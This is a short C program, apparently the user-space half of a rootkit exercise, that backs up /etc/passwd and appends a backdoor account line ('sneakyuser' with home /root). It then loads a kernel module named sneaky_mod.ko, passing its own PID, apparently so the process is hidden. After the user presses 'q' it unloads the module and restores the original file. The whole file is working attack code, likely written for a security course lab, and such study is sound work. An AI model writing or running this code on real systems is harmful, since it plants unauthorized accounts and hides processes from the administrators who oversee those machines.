#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_pid() {
    printf("sneaky_process pid = %d\n", getpid());
}

void copy_file(){
    system("cp /etc/passwd /tmp/passwd");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

}

void load_sneaky_module(){
    char cmd[50];
    int pid = getpid();
    sprintf(cmd, "insmod sneaky_mod.ko sneaky_pid=%d", pid);
    system(cmd);
}

void read_input(){
    char c;
    while(1){
        c = getchar();
        if(c == 'q'){
            break;
        }
    }
}
void unload_sneaky_module() {
    system("rmmod sneaky_mod");
}

void restore_file() {
    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd");
}

int main(){
    print_pid();
    copy_file();
    load_sneaky_module();
    read_input();
    unload_sneaky_module();
    restore_file();
    return 0;
}